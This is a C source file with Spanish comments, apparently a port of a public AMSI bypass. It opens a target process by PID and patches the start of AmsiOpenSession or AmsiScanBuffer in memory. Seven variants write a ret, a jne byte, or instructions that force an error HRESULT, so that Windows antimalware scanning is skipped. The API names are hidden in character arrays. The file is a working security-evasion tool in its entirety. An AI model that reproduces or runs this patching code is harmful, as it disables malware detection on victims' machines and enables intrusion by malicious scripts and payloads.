/* ¡Gracias a Saad!
 * Fragmento de código compartido conmigo por Saad, también conocido como @D1rkMtr (https://twitter.com/D1rkMtr/)
 * He añadido algunos otros parches basados en mi pequeña investigación usando Windbg.
 * ReWrite from C++ to C by grisun0 09/02/2205 # x86_64-w64-mingw32-gcc -o amsi.exe amsi.c
 */

#include <windows.h>
#include <stdio.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

unsigned char ams1[] = { 'a','m','s','i','.','d','l','l', 0x0 };
unsigned char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n', 0x0 };
unsigned char ams15can[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r', 0x0};

// Declaraciones de los punteros a las funciones
typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

typedef NTSTATUS(WINAPI *NtWriteVirtualMemoryType)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

// Punteros a las funciones
NtProtectVirtualMemoryType NtProtectVirtualMemory = NULL;
NtWriteVirtualMemoryType NtWriteVirtualMemory = NULL;

// Función para cargar las funciones dinámicamente
void LoadNtFunctions() {
    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    if (hNtDll) {
        NtProtectVirtualMemory = (NtProtectVirtualMemoryType)GetProcAddress(hNtDll, "NtProtectVirtualMemory");
        NtWriteVirtualMemory = (NtWriteVirtualMemoryType)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
        if (!NtProtectVirtualMemory || !NtWriteVirtualMemory) {
            printf("Failed to get procedure address\n");
            exit(1);
        }
    } else {
        printf("Failed to load ntdll.dll\n");
        exit(1);
    }
}

/*
DWORD64 GetAddr(LPVOID addr) {

    for (int i = 0; i < 1024; i++) {

        if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
    }

}
*/

// Técnica de Saad, también conocido como @D1rkMtr (https://twitter.com/D1rkMtr/) (https://github.com/TheD1rkMtr/AMSI_patch)
// 1
void AMS1patch_OpenSession_jne(HANDLE hproc)
{

    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams10pen);

    char Patch[100];
    ZeroMemory(Patch, 100);

    // Pegando el código de operación jne
    lstrcatA(Patch, "\x75");

    printf("\n[+] El Parche: %p\n\n", *(INT_PTR*)Patch);

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el objetivo: Puntero al tercer desplazamiento de amsi!OpenSession
    void* ptraddr = (void*)((DWORD64)ptr + 0x3);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr + 0x3), (PVOID)Patch, 1, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tSaltando la entrada a `amsi!AmsiOpenSession+0x4c` vía `jne`, si todas las instrucciones tienen éxito antes de la llamada a `jne`\n\t=> Terminaríamos directamente en `amsi!AmsiCloseSession`.\n\n");
}

// 2
void AMS1patch_OpenSession_ret(HANDLE hproc)
{
    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams10pen);

    char Patch[100];
    ZeroMemory(Patch, 100);

    // Pegando el código de operación ret
    lstrcatA(Patch, "\xc3");

    printf("\n[+] El Parche: %p\n", *(INT_PTR*)Patch);

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el objetivo: Puntero a la apertura de amsi!OpenSession
    void* ptraddr = (void*)((DWORD64)ptr);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    // Asignando memoria al inicio de amsi!OpenSession para editar
    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tSaltando la entrada a `amsi!AmsiOpenSession+0x4c` vía `ret`, pegando directamente `c3` al inicio de `amsi!AmsiOpenSession`\n\t=> Terminaríamos directamente en `amsi!AmsiCloseSession`.\n\n");
}

// 3
void AMS1patch_ScanBuffer_ret(HANDLE hproc)
{
    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

    char Patch[100];
    ZeroMemory(Patch, 100);

    // Pegando el código de operación ret
    lstrcatA(Patch, "\xc3");

    printf("\n[+] El Parche: %p\n", *(INT_PTR*)Patch);

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el objetivo: Puntero a la apertura de amsi!ScanBuffer
    void* ptraddr = (void*)((DWORD64)ptr);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tSaltando la ejecución de las instrucciones principales de `amsi!AmsiScanBuffer` vía `ret`, pegando directamente `c3` al inicio de `amsi!AmsiScanBuffer`\n\n");
}

// 4
void AMS1patch_RastaMouse(HANDLE hproc)
{
    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

    //char Patch[100];
    //ZeroMemory(Patch, 100);

    printf("\n[+] Aquí, el valor (más bien el valor de error) de HRESULT es 'E_INVALIDARG'\tFuente: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

    // Pegando el código de operación ret
    //lstrcatA(Patch, "\xB8\x57\x00\x07\x80\xC3");

    // Little Endian
    printf("[+] El Parche: %p\n", *(INT_PTR*)"\xB8\x57\x00\x07\x80\xC3");

    //lstrcatA(Patch, "\x00\x57\xB8");
    //lstrcatA(Patch, "\xB8\x57\x00\x07");
    //printf("[+] El Parche: %p\n", *(INT_PTR*)Patch);

    //lstrcatA(Patch, "\x80\xc3");
    //printf("[+] El Parche: %p\n", *(LONG_PTR*)Patch);

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el objetivo: Puntero a la apertura de amsi!ScanBuffer
    void* ptraddr = (void*)((DWORD64)ptr);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x57\x00\x07\x80\xC3", 6, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tOmitiendo la rama que realiza el escaneo en `amsi!AmsiScanBuffer` y retorna, pegando directamente `\\xB8\\x57\\x00\\x07\\x80\\xC3` ('mov eax, 0x80070057; ret') al inicio de `amsi!AmsiScanBuffer`\n\n");
}

// 5
void AMS1patch_E_ACCESSDENIED(HANDLE hproc)
{
    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

    //char Patch[100];
    //ZeroMemory(Patch, 100);

    printf("[+] Aquí, el valor (más bien el valor de error) de HRESULT es 'E_ACCESSDENIED'\tFuente: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

    // Pegando el código de operación ret
    //lstrcatA(Patch, "\xB8\x05\x00\x07\x80\xC3");

    // Little Endian
    printf("\n[+] El Parche: %p\n\n", *(INT_PTR*)"\xB8\x05\x00\x07\x80\xC3");

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el objetivo: Puntero a la apertura de amsi!ScanBuffer
    void* ptraddr = (void*)((DWORD64)ptr);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x05\x00\x07\x80\xC3", 6, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tOmitiendo la rama que realiza el escaneo en `amsi!AmsiScanBuffer` y retorna, pegando directamente `\\xB8\\x05\\x00\\x07\\x80\\xC3` ('mov eax, 0x80070005; ret') al inicio de `amsi!AmsiScanBuffer`\n\n");
}

// 6
void AMS1patch_E_HANDLE(HANDLE hproc)
{
    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

    //char Patch[100];
    //ZeroMemory(Patch, 100);

    printf("[+] Aquí, el valor (más bien el valor de error) de HRESULT es 'E_HANDLE'\tFuente: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

    // Pegando el código de operación ret
    //lstrcatA(Patch, "\xB8\x06\x00\x07\x80\xC3");

    // Little Endian
    printf("\n[+] El Parche: %p\n\n", *(INT_PTR*)"\xB8\x06\x00\x07\x80\xC3");

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el objetivo: Puntero a la apertura de amsi!ScanBuffer
    void* ptraddr = (void*)((DWORD64)ptr);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x06\x00\x07\x80\xC3", 6, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tOmitiendo la rama que realiza el escaneo en `amsi!AmsiScanBuffer` y retorna, pegando directamente `\\xB8\\x06\\x00\\x07\\x80\\xC3` ('mov eax, 0x80070006; ret') al inicio de `amsi!AmsiScanBuffer`\n\n");
}

// 7
void AMS1patch_E_OUTOFMEMORY(HANDLE hproc)
{
    void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

    //char Patch[100];
    //ZeroMemory(Patch, 100);

    // Pegando el código de operación ret
    //lstrcatA(Patch, "\xB8\x0E\x00\x07\x80\xC3");

    printf("[+] Aquí, el valor (más bien el valor de error) de HRESULT es 'E_OUTOFMEMORY'\tFuente: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

    printf("\n[+] El Parche: %p\n\n", *(INT_PTR*)"\xB8\x0E\x00\x07\x80\xC3");

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    //void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

    // Editando el inicio de amsi!ScanBuffer
    void* ptraddr = (void*)((DWORD64)ptr);
    //void* ptraddr2 = (void*)GetAddr(ptr);

    printf("Dirección de inicio de la función: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
    printf("Dirección objetivo de la función a editar: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
    //printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

    //NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
    //                                                 OUT PVOID*
    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Fallo en NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)NULL);
    //                                                 IN PVOID
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x0E\x00\x07\x80\xC3", 6, (SIZE_T*)NULL);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Fallo en NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }
    //NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Fallo en NtProtectVirtualMemory (%u)\n", GetLastError());
        return;
    }

    printf("\n[+] AMSI parcheado\n\tOmitiendo la rama que realiza el escaneo en `amsi!AmsiScanBuffer` y retorna, pegando directamente `\\xB8\\x0E\\x00\\x07\\x80\\xC3` ('mov eax, 0x8007000E; ret') al inicio de `amsi!AmsiScanBuffer`\n\n");
}

int main(int argc, char** argv)
{
    LoadNtFunctions();
    HANDLE hproc;

    if (argc != 3)
    {
        printf("\nUSO: .\\%s <PID> <tipo de parche>\n", argv[0]);
        printf("\n[1] parche_via_OpenSession_jne\n[2] parche_via_OpenSession_ret\n[3] parche_via_ScanBuffer_ret\n[4] parche_via_@RastaMouse\n[5] parche_via_E_ACCESSDENIED_codigo_de_error\n[6] parche_via_E_HANDLE_codigo_de_error\n[7] parche_via_E_OUTOFMEMORY_codigo_de_error\n\n");
        return 1;
    }

    hproc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
    if (!hproc)
    {
        printf("Fallo en OpenProcess (%u)\n", GetLastError());
        return 2;
    }

    if ((DWORD)atoi(argv[2]) == 1)
    {
        AMS1patch_OpenSession_jne(hproc);
    }
    else if ((DWORD)atoi(argv[2]) == 2)
    {
        AMS1patch_OpenSession_ret(hproc);
    }
    else if ((DWORD)atoi(argv[2]) == 3)
    {
        AMS1patch_ScanBuffer_ret(hproc);
    }
    else if ((DWORD)atoi(argv[2]) == 4)
    {
        AMS1patch_RastaMouse(hproc);
    }
    else if ((DWORD)atoi(argv[2]) == 5)
    {
        AMS1patch_E_ACCESSDENIED(hproc);
    }
    else if ((DWORD)atoi(argv[2]) == 6)
    {
        AMS1patch_E_HANDLE(hproc);
    }
    else if ((DWORD)atoi(argv[2]) == 7)
    {
        AMS1patch_E_OUTOFMEMORY(hproc);
    }
    else
    {
        printf("[!] Opción incorrecta");
    }

    return 0;

}
